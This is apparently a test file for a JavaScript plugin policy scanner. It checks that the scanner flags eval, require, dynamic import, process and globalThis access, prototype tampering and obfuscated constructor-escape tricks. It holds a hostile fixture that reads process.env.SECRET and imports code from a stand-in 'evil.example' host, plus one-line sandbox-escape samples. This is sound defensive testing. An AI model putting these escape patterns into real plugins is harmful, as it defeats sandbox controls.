import { test } from "node:test";
import assert from "node:assert/strict";
import { createPolicyScanner } from "../src/policy/index.js";
import type { PolicyReasonCode } from "../src/types/index.js";

const scanner = createPolicyScanner();

const CLEAN = `
const sdk = require("@16xbrains/plugin-sdk");
module.exports = sdk.definePlugin({
  id: "outsourced-analytics",
  version: "1.0.0",
  handler: function (payload, ctx) {
    ctx.log("info", "scoring");
    return { ok: true, n: Math.round(Number(payload.n) || 0) };
  },
});
`;

function codes(source: string, level: "strict" | "standard" = "strict"): PolicyReasonCode[] {
  return scanner.scan(source, level).violations.map((v) => v.code);
}

test("clean plugin passes at strict", () => {
  const r = scanner.scan(CLEAN, "strict");
  assert.equal(r.ok, true, JSON.stringify(r.violations));
  assert.equal(r.violations.length, 0);
});

test("hostile fixture flags proc, require, eval, dyn-import", () => {
  const hostile = `
    const a = process.env.SECRET;
    const fs = require("fs");
    eval("x");
    import("https://evil.example");
    module.exports = definePlugin({ id:"x", version:"1.0.0", handler:function(){ return {}; } });
  `;
  const c = codes(hostile);
  for (const need of ["POL-GLOBAL-PROC", "POL-REQUIRE", "POL-EVAL", "POL-DYN-IMPORT"] as const) {
    assert.ok(c.includes(need), `expected ${need} in ${c.join(",")}`);
  }
});

const SHAPE_TAIL = `\nmodule.exports = definePlugin({ id:"x", version:"1.0.0", handler:function(){ return {}; } });`;

const perRule: Array<[PolicyReasonCode, string, "strict" | "standard"]> = [
  ["POL-EVAL", `eval("1");` + SHAPE_TAIL, "strict"],
  ["POL-FUNC-CTOR", `const f = new Function("return 1");` + SHAPE_TAIL, "strict"],
  ["POL-CTOR-ESCAPE", `const c = ({}).constructor;` + SHAPE_TAIL, "strict"],
  ["POL-REQUIRE", `const x = require("fs");` + SHAPE_TAIL, "strict"],
  ["POL-DYN-IMPORT", `import("x");` + SHAPE_TAIL, "strict"],
  ["POL-PROTO", `const o = {}; o.__proto__ = null;` + SHAPE_TAIL, "strict"],
  ["POL-WITH", `with (Math) { }` + SHAPE_TAIL, "standard"],
  ["POL-GLOBAL-PROC", `const p = process;` + SHAPE_TAIL, "strict"],
  ["POL-GLOBAL-THIS", `const g = globalThis;` + SHAPE_TAIL, "strict"],
];

for (const [code, src, level] of perRule) {
  test(`per-rule: ${code} flagged with non-null line`, () => {
    const r = scanner.scan(src, level);
    const hit = r.violations.find((v) => v.code === code);
    assert.ok(hit, `expected ${code} in ${r.violations.map((v) => v.code).join(",")}`);
    assert.notEqual(hit!.line, null);
  });
}

test("POL-IMPORT on ESM import", () => {
  const r = scanner.scan(`import x from "y";` + SHAPE_TAIL, "strict");
  assert.ok(r.violations.some((v) => v.code === "POL-IMPORT"));
});

test("POL-SIZE before parse", () => {
  const big = "//" + "a".repeat(524_300);
  const r = scanner.scan(big, "strict");
  assert.ok(r.violations.some((v) => v.code === "POL-SIZE"));
});

test("POL-PARSE on syntax error", () => {
  const r = scanner.scan(`function ( {`, "strict");
  assert.ok(r.violations.some((v) => v.code === "POL-PARSE"));
});

test("POL-SHAPE when definePlugin missing", () => {
  const r = scanner.scan(`module.exports = { id: "x" };`, "strict");
  assert.ok(r.violations.some((v) => v.code === "POL-SHAPE"));
});

test('computed ["constr"+"uctor"] → POL-CTOR-ESCAPE strict, clean at standard', () => {
  const src = `const x = ({})["constr"+"uctor"];` + SHAPE_TAIL;
  assert.ok(codes(src, "strict").includes("POL-CTOR-ESCAPE"));
  assert.equal(codes(src, "standard").includes("POL-CTOR-ESCAPE"), false);
});

test("standard level does not apply POL-GLOBAL-THIS", () => {
  const src = `const g = globalThis;` + SHAPE_TAIL;
  assert.equal(codes(src, "standard").includes("POL-GLOBAL-THIS"), false);
});
